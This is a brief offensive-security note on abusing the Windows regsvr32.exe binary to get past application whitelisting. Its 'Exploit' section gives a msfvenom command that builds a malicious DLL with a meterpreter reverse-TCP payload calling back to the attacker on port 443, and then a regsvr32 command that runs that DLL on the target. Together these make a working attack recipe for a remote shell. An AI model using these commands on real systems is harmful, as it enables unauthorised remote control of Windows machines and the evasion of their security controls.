# regsvr32
Regsvr32 is a Microsoft command-line tool to register and unregister Dynamic Link Libraries (DLLs)  in the Windows Registry. The regsvr.exe binary is located at:

*   C:\\Windows\\System32\\regsvr32.exe for the Windows 32 bits version
*   C:\\Windows\\SysWOW64\\regsvr32.exe for the Windows 64 bits version

The technique used in the regsvr32.exe uses trusted Windows OS components and is executed in memory, which is one of the reasons why this technique is also used to bypass application whitelisting. 

Exploit:

Create a malicious dll with:

```text-plain
msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f dll -a x86 -o living.dll 
```

transfer it to host, and run it with:

```text-plain
c:\Windows\System32\regsvr32.exe living.dll
```